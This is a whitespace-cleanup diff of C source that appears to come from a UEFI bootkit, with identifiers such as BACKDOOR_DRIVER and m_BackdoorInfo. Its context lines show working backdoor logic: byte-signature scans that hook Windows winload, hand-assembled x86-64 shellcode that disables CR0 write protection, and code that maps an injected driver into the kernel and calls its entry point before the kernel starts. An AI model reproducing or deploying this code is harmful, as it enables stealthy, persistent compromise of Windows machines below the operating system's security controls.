@@ -59,9 +59,9 @@ typedef struct _SHELLCODE_CONTEXT
     UINT8 pop_rax;
     UINT32 sub_rax;
 
-    // save registers  
-    UINT8 push_rdx;  
-    UINT8 push_rcx;    
+    // save registers
+    UINT8 push_rdx;
+    UINT8 push_rcx;
     UINT16 push_r8;
     UINT16 push_r9;
 
@@ -80,12 +80,12 @@ typedef struct _SHELLCODE_CONTEXT
 
     // restore registers
     UINT16 pop_r9;
-    UINT16 pop_r8;    
+    UINT16 pop_r8;
     UINT8 pop_rcx;
-    UINT8 pop_rdx;    
+    UINT8 pop_rdx;
 
     // jmp rax
-    UINT16 jmp_rax;    
+    UINT16 jmp_rax;
 
     VOID *DriverAddr;
     UINT32 DriverSize;
@@ -94,10 +94,10 @@ typedef struct _SHELLCODE_CONTEXT
     UINT32 EntryPoint;
     UINT32 SectionOffset;
     
-    VOID *KernelBase;   
-    func_ExAllocatePool f_ExAllocatePool; 
+    VOID *KernelBase;
+    func_ExAllocatePool f_ExAllocatePool;
     func_MmUnmapIoSpace f_MmUnmapIoSpace;
-    func_MmMapIoSpace f_MmMapIoSpace;    
+    func_MmMapIoSpace f_MmMapIoSpace;
 
     UINT8 Shellcode[];
 
@@ -111,17 +111,17 @@ typedef UINT32 (EFIAPI * DRIVER_ENTRY)(VOID *Unused, PBACKDOOR_DRIVER Context);
 #define CR0_WP 0x000010000
 
 VOID *Shellcode(PSHELLCODE_CONTEXT Context)
-{    
+{
     UINT32 i = 0;
     VOID *ImageBase = Context->LoaderEntry->DllBase;
     VOID *EntryPoint = RVATOVA(ImageBase, Context->EntryPoint);
 
     EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
-        ImageBase, ((EFI_IMAGE_DOS_HEADER *)ImageBase)->e_lfanew);  
+        ImageBase, ((EFI_IMAGE_DOS_HEADER *)ImageBase)->e_lfanew);
 
     EFI_IMAGE_SECTION_HEADER *pSection = (EFI_IMAGE_SECTION_HEADER *)RVATOVA(
         ImageBase, Context->SectionOffset);
-    
+
     // map physical memory with driver image
     UINT8 *Mem = (UINT8 *)Context->f_MmMapIoSpace(Context->DriverAddr, Context->DriverSize, 0);
     if (Mem)
@@ -134,7 +134,7 @@ VOID *Shellcode(PSHELLCODE_CONTEXT Context)
             if (Driver)
             {
                 EFI_IMAGE_NT_HEADERS *pHeadersDriver = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
-                    Mem, ((EFI_IMAGE_DOS_HEADER *)Mem)->e_lfanew);    
+                    Mem, ((EFI_IMAGE_DOS_HEADER *)Mem)->e_lfanew);
 
                 DRIVER_ENTRY DriverEntry = (DRIVER_ENTRY)RVATOVA(
                     Driver, pHeadersDriver->OptionalHeader.AddressOfEntryPoint);
@@ -156,7 +156,7 @@ VOID *Shellcode(PSHELLCODE_CONTEXT Context)
                     // wipe old driver image
                     *(Mem + i) = 0;
 #endif
-                }                
+                }
 
                 // call driver entry point
                 DriverEntry(NULL, &DriverContext);
@@ -178,9 +178,9 @@ VOID *Shellcode(PSHELLCODE_CONTEXT Context)
 
     // restore write protection
     __writecr0(__readcr0() | CR0_WP);
-        
+
     // restore entry point in loader block
-    Context->LoaderEntry->EntryPoint = EntryPoint;    
+    Context->LoaderEntry->EntryPoint = EntryPoint;
 
     return EntryPoint;
 }
@@ -193,14 +193,14 @@ UINT32 ShellcodeEnd(VOID)
 BOOLEAN ShellcodePrepare(VOID *KernelBase, PLDR_DATA_TABLE_ENTRY LoaderEntry)
 {
     PSHELLCODE_CONTEXT Context = NULL;
-    UINT32 ShellcodeSize = (UINT32)((UINTN)&ShellcodeEnd - (UINTN)&Shellcode), i = 0;    
+    UINT32 ShellcodeSize = (UINT32)((UINTN)&ShellcodeEnd - (UINTN)&Shellcode), i = 0;
     VOID *ImageBase = LoaderEntry->DllBase;
 
     EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
-        ImageBase, ((EFI_IMAGE_DOS_HEADER *)ImageBase)->e_lfanew);    
+        ImageBase, ((EFI_IMAGE_DOS_HEADER *)ImageBase)->e_lfanew);
 
     EFI_IMAGE_SECTION_HEADER *pSection = (EFI_IMAGE_SECTION_HEADER *)RVATOVA(
-        &pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);    
+        &pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);
 
     func_ExAllocatePool f_ExAllocatePool = NULL;
     func_MmUnmapIoSpace f_MmUnmapIoSpace = NULL;
@@ -255,14 +255,14 @@ BOOLEAN ShellcodePrepare(VOID *KernelBase, PLDR_DATA_TABLE_ENTRY LoaderEntry)
     Context->call_sc_offset = 0;
 
     // pop rax
-    Context->pop_rax = 0x58;    
+    Context->pop_rax = 0x58;
 
     // sub rax, 5
     Context->sub_rax = 0x05e88348;
 
     // push {rdx, rcx, r8, r9}
     Context->push_rdx = 0x52;
-    Context->push_rcx = 0x51;    
+    Context->push_rcx = 0x51;
     Context->push_r8 = 0x5041;
     Context->push_r9 = 0x5141;
 
@@ -276,14 +276,14 @@ BOOLEAN ShellcodePrepare(VOID *KernelBase, PLDR_DATA_TABLE_ENTRY LoaderEntry)
     Context->call_sc_op = 0xe8;
     Context->call_sc_offset = 
         OFFSET_OF(SHELLCODE_CONTEXT, Shellcode) - 
-        OFFSET_OF(SHELLCODE_CONTEXT, call_sc_op) - JUMP32_LEN;    
+        OFFSET_OF(SHELLCODE_CONTEXT, call_sc_op) - JUMP32_LEN;
 
     // add rsp, 0x48
     Context->add_rsp = 0x48c48348;
 
     // pop {r9, r8, rcx, rdx}
     Context->pop_r9 = 0x5941;
-    Context->pop_r8 = 0x5841;    
+    Context->pop_r8 = 0x5841;
     Context->pop_rcx = 0x59;
     Context->pop_rdx = 0x5a;
 
@@ -320,7 +320,7 @@ BOOLEAN FindLoaderEntry(PLDR_DATA_TABLE_ENTRY LoaderEntry)
         LoaderEntry->BaseDllName.Length > 0 && LoaderEntry->BaseDllName.Buffer &&
         LoaderEntry->BaseDllName.Length / sizeof(UINT16) < MAX_MODULE_NAME_LEN - 1) 
     {
-        UINT16 BaseDllName[MAX_MODULE_NAME_LEN], *p = BaseDllName;   
+        UINT16 BaseDllName[MAX_MODULE_NAME_LEN], *p = BaseDllName;
         UINT16 i = 0;
 
         // copy boot driver file name into the buffer
@@ -406,15 +406,15 @@ _end:
 //--------------------------------------------------------------------------------------
 BOOLEAN WinloadHook(VOID *WinloadBase)
 {
-    UINT32 i = 0, CodeAddr = 0, CodeSize = 0;    
+    UINT32 i = 0, CodeAddr = 0, CodeSize = 0;
     UINT8 *HvlpBelow1MbPageAllocated = NULL;
-    VOID **HvlpBelow1MbPage = NULL;        
+    VOID **HvlpBelow1MbPage = NULL;
 
     EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
         WinloadBase, ((EFI_IMAGE_DOS_HEADER *)WinloadBase)->e_lfanew);
 
     EFI_IMAGE_SECTION_HEADER *pSection = (EFI_IMAGE_SECTION_HEADER *)RVATOVA(
-        &pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);    
+        &pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);
 
     DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): winload image address is "FPTR"\r\n", WinloadBase);
 
@@ -437,9 +437,9 @@ BOOLEAN WinloadHook(VOID *WinloadBase)
     // update status
     m_BackdoorInfo.Status = BACKDOOR_ERR_WINLOAD_SIGN_1;
 
-    for (i = 0; i < CodeSize - PAGE_SIZE; i += 1) 
+    for (i = 0; i < CodeSize - PAGE_SIZE; i += 1)
     {
-        UINT8 *Buff = RVATOVA(WinloadBase, CodeAddr + i);        
+        UINT8 *Buff = RVATOVA(WinloadBase, CodeAddr + i);
 
         /*
             Match winload!OslpBuildKernelMemoryMap() code signature:
@@ -450,7 +450,7 @@ BOOLEAN WinloadHook(VOID *WinloadBase)
                 mov     rdx, cs:HvlpBelow1MbPage
                 shl     rax, 0Ch
                 cmp     rax, rdx
-                ja      loc_140006220            
+                ja      loc_140006220
         */
         if ((*(UINT32 *)(Buff + 0x0c) == 0x10468b48 &&
              *(UINT32 *)(Buff + 0x17) == 0x0ce0c148 &&
@@ -571,7 +571,7 @@ BOOLEAN WinloadHook(VOID *WinloadBase)
     // update status
     m_BackdoorInfo.Status = BACKDOOR_ERR_WINLOAD_SIGN_2;
 
-    for (i = 0; i < CodeSize - PAGE_SIZE; i += 1) 
+    for (i = 0; i < CodeSize - PAGE_SIZE; i += 1)
     {
         UINT8 *Buff = RVATOVA(WinloadBase, CodeAddr + i), *Func = NULL;
         UINTN Size = 0;
@@ -590,7 +590,7 @@ BOOLEAN WinloadHook(VOID *WinloadBase)
                 lea     rax, OslArchKernelGdt
                 lea     rcx, OslArchKernelIdt
                 lgdt    fword ptr [rax]
-                lidt    fword ptr [rcx]            
+                lidt    fword ptr [rcx]
         */
         if ((*(Buff + 0x00) == 0x33 && *(Buff + 0x01) == 0xf6 &&
              *(Buff + 0x15) == 0x48 && *(Buff + 0x16) == 0x8d && *(Buff + 0x17) == 0x05 &&
@@ -624,7 +624,7 @@ BOOLEAN WinloadHook(VOID *WinloadBase)
                   *(Buff + 0x28) == 0x0f && *(Buff + 0x29) == 0x01 && *(Buff + 0x2a) == 0x19))
         {
             Func = Buff;
-            Size = 16;            
+            Size = 16;
         }
 
         if (Func != NULL)
@@ -678,7 +678,7 @@ BOOLEAN WinloadInitialize(void)
     UINT32 DriverSize = ImageSize + m_PayloadSize, i = 0;
 
     EFI_PHYSICAL_ADDRESS Addr = 0;
-    UINTN PagesCount = (DriverSize / PAGE_SIZE) + 1;    
+    UINTN PagesCount = (DriverSize / PAGE_SIZE) + 1;
 
     // allocate memory for driver image
     EFI_STATUS Status = m_BS->AllocatePages(
@@ -688,23 +688,23 @@ BOOLEAN WinloadInitialize(void)
         &Addr
     );
     if (Status == EFI_SUCCESS)
-    { 
+    {
         VOID *DriverAddr = (VOID *)Addr;
 
         // copy driver headers
         std_memcpy(DriverAddr, driver, pHeaders->OptionalHeader.SizeOfHeaders);
 
-        // copy driver sections        
+        // copy driver sections
         for (i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1)
         {            
             std_memcpy(
-                RVATOVA(DriverAddr, pSection->VirtualAddress), 
+                RVATOVA(DriverAddr, pSection->VirtualAddress),
                 RVATOVA(driver, pSection->PointerToRawData),
                 min(pSection->SizeOfRawData, pSection->Misc.VirtualSize)
             );
 
             pSection += 1;
-        }    
+        }
 
         if (m_Payload)
         {
